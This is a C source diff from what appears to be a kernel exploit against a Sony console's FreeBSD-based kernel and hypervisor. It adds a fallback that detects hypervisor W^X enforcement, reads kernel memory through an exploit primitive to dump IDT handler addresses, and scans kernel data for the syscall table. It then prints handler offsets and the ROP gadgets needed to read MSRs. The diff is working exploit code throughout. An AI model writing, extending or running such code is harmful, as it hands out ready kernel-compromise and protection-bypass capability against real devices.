@@ -1930,6 +1930,24 @@ static void campaign_kmod_kldload(void) {
                 }
             }
 
+            /* Check if the cave is in ktext (executable) or kdata (NX).
+             * Sony's HV enforces strict W^X via NPT:
+             *   ktext pages: execute-only (XOM) — can't read/write
+             *   kdata pages: read-write — can't execute
+             * If the cave is in kdata, we can write shellcode there but
+             * executing it will trigger #NPF → crash.  Skip execution. */
+            int cave_in_ktext = (cave_kva >= g_ktext_base &&
+                                 cave_kva < g_ktext_base + 0xC00000);
+            if (!cave_in_ktext) {
+                printf("[!] Code cave is in kdata (0x%lx), NOT ktext.\n",
+                       (unsigned long)cave_kva);
+                printf("    NPT enforces NX on kdata pages — execution would crash.\n");
+                printf("    ktext is XOM (read/write blocked) — can't inject there either.\n");
+                printf("    W^X enforcement prevents direct shellcode injection.\n");
+                printf("\n[*] Step 4d: Falling back to ring-3 diagnostics...\n");
+                goto ring3_fallback;
+            }
+
             /* Save original bytes from code cave */
             kernel_copyout(g_dmap_base + cave_pa, cave_backup, sc_len);
             printf("[*] Saved %d bytes from code cave.\n", sc_len);
@@ -2035,6 +2053,158 @@ static void campaign_kmod_kldload(void) {
         else
             printf("[-] Buffer still zero after INT invocation.\n");
 
+        goto idt_done;
+
+ring3_fallback:
+        /* ── Step 4d: Ring-3 diagnostics (W^X prevents code injection) ──
+         *
+         * HV NPT enforces strict W^X:
+         *   ktext: X-only (can execute, can't read/write)
+         *   kdata/DMAP: RW (can read/write, can't execute)
+         *
+         * Without writable+executable pages, we can't inject shellcode.
+         * Collect what we can from ring 3 and dump sysent for future ROP. */
+
+        /* 4d-1: sysarch-based FS/GS BASE reads
+         * sysarch(2) = syscall 165, subcommands:
+         *   128 = AMD64_GET_FSBASE
+         *   130 = AMD64_GET_GSBASE */
+        {
+            #define SYS_sysarch     165
+            #define AMD64_GET_FSBASE 128
+            #define AMD64_GET_GSBASE 130
+            uint64_t fs_base = 0, gs_base = 0;
+            int sa_ret;
+            sa_ret = syscall(SYS_sysarch, AMD64_GET_FSBASE, &fs_base);
+            printf("[*] sysarch(GET_FSBASE): ret=%d, value=0x%lx\n",
+                   sa_ret, (unsigned long)fs_base);
+            sa_ret = syscall(SYS_sysarch, AMD64_GET_GSBASE, &gs_base);
+            printf("[*] sysarch(GET_GSBASE): ret=%d, value=0x%lx\n",
+                   sa_ret, (unsigned long)gs_base);
+        }
+
+        /* 4d-2: Known values from exploit setup */
+        printf("[*] Known from exploit:\n");
+        printf("    ktext_base  = 0x%lx\n", (unsigned long)g_ktext_base);
+        printf("    kdata_base  = 0x%lx\n", (unsigned long)g_kdata_base);
+        printf("    dmap_base   = 0x%lx\n", (unsigned long)g_dmap_base);
+        printf("    CR3 (phys)  = 0x%lx\n", (unsigned long)g_cr3_phys);
+
+        /* 4d-3: IDT handler addresses (ktext reference points) */
+        {
+            struct {
+                uint16_t limit;
+                uint64_t base;
+            } __attribute__((packed)) idtr2;
+            __asm__ volatile("sidt %0" : "=m"(idtr2));
+
+            struct {
+                uint16_t offset_lo; uint16_t selector;
+                uint8_t ist; uint8_t type_attr;
+                uint16_t offset_mid; uint32_t offset_hi; uint32_t reserved;
+            } __attribute__((packed)) gate;
+
+            printf("[*] IDT handler addresses (ktext references for future ROP):\n");
+            static const struct { int vec; const char *name; } idt_vecs[] = {
+                {0, "#DE"}, {1, "#DB"}, {2, "NMI"}, {3, "#BP"},
+                {6, "#UD"}, {8, "#DF"}, {13, "#GP"}, {14, "#PF"},
+                {32, "Timer"}, {128, "int80"},
+            };
+            for (unsigned i = 0; i < sizeof(idt_vecs)/sizeof(idt_vecs[0]); i++) {
+                int v = idt_vecs[i].vec;
+                kernel_copyout(idtr2.base + v * 16, &gate, 16);
+                uint64_t handler = (uint64_t)gate.offset_lo |
+                                   ((uint64_t)gate.offset_mid << 16) |
+                                   ((uint64_t)gate.offset_hi << 32);
+                printf("    IDT[%3d] %-6s = 0x%lx (ktext+0x%lx)\n",
+                       v, idt_vecs[i].name, (unsigned long)handler,
+                       (unsigned long)(handler - g_ktext_base));
+            }
+        }
+
+        /* 4d-4: Sysent table dump (first 32 entries for ROP planning) */
+        {
+            /* On FreeBSD, sysent is in kdata at a known offset.
+             * Each entry: { int sy_narg; sy_call_t *sy_call; ... }
+             * On AMD64 FreeBSD 11: sizeof(struct sysent) = 16 bytes
+             *   offset 0: int32_t sy_narg (4 bytes)
+             *   offset 4: int32_t pad    (4 bytes)
+             *   offset 8: void *sy_call  (8 bytes) */
+            printf("[*] Scanning kdata for sysent table...\n");
+
+            /* Read sysent[0] (nosys) through sysent[10] to find the table.
+             * sysent[1] = sys_exit (1 arg), sysent[2] = sys_fork (0 args),
+             * sysent[3] = sys_read (3 args), sysent[4] = sys_write (3 args).
+             * Match pattern: narg sequence {0,1,0,3,3,...} */
+            static const int expected_nargs[] = {0, 1, 0, 3, 3, 1, 3, 0, 3};
+            int sysent_found = 0;
+            uint64_t sysent_kva = 0;
+
+            /* Search kdata for the sysent array (scan first 64MB) */
+            for (uint64_t off = 0; off < 0x4000000 && !sysent_found; off += 8) {
+                uint64_t kva = g_kdata_base + off;
+                uint8_t sample[16 * 9];  /* 9 entries × 16 bytes */
+                if (kernel_copyout(kva, sample, sizeof(sample)) != 0) continue;
+
+                int match = 1;
+                for (int i = 0; i < 9 && match; i++) {
+                    int32_t narg;
+                    memcpy(&narg, &sample[i * 16], 4);
+                    if (narg != expected_nargs[i]) match = 0;
+                }
+                if (match) {
+                    /* Verify sy_call pointers are in ktext range */
+                    uint64_t call0;
+                    memcpy(&call0, &sample[8], 8);
+                    if (call0 >= g_ktext_base && call0 < g_ktext_base + 0x2000000) {
+                        sysent_kva = kva;
+                        sysent_found = 1;
+                    }
+                }
+            }
+
+            if (sysent_found) {
+                printf("[+] Sysent table at kdata+0x%lx (KVA 0x%lx)\n",
+                       (unsigned long)(sysent_kva - g_kdata_base),
+                       (unsigned long)sysent_kva);
+
+                /* Dump key syscalls for ROP planning */
+                printf("[*] Key sysent entries (sy_narg, sy_call → ktext offset):\n");
+                static const struct { int num; const char *name; } key_syscalls[] = {
+                    {0, "nosys"}, {1, "exit"}, {2, "fork"}, {3, "read"},
+                    {4, "write"}, {5, "open"}, {6, "close"},
+                    {20, "getpid"}, {37, "kill"}, {54, "ioctl"},
+                    {59, "execve"}, {73, "munmap"}, {74, "mprotect"},
+                    {165, "sysarch"}, {202, "sysctl"},
+                    {304, "kldload"}, {305, "kldunload"}, {308, "kldstat"},
+                    {477, "mmap"}, {337, "kldsym"},
+                };
+                for (unsigned i = 0; i < sizeof(key_syscalls)/sizeof(key_syscalls[0]); i++) {
+                    int num = key_syscalls[i].num;
+                    uint8_t entry[16];
+                    kernel_copyout(sysent_kva + num * 16, entry, 16);
+                    int32_t narg;
+                    uint64_t sy_call;
+                    memcpy(&narg, entry, 4);
+                    memcpy(&sy_call, entry + 8, 8);
+                    printf("    [%3d] %-12s narg=%d  sy_call=0x%lx (ktext+0x%lx)\n",
+                           num, key_syscalls[i].name, narg,
+                           (unsigned long)sy_call,
+                           (unsigned long)(sy_call - g_ktext_base));
+                }
+
+                printf("\n[*] For ROP-based MSR reading, key gadgets needed:\n");
+                printf("    1. 'ret' gadget at known ktext offset\n");
+                printf("    2. 'pop rcx; ret' to set MSR number\n");
+                printf("    3. 'rdmsr; ret' or function containing rdmsr\n");
+                printf("    4. Gadget to store RAX/RDX to memory\n");
+                printf("    Use sysent sy_call addresses as ktext anchors.\n");
+            } else {
+                printf("[-] Sysent table not found in kdata (first 64MB).\n");
+            }
+        }
+
+idt_done: ;
 idt_skip: ;
     }
 
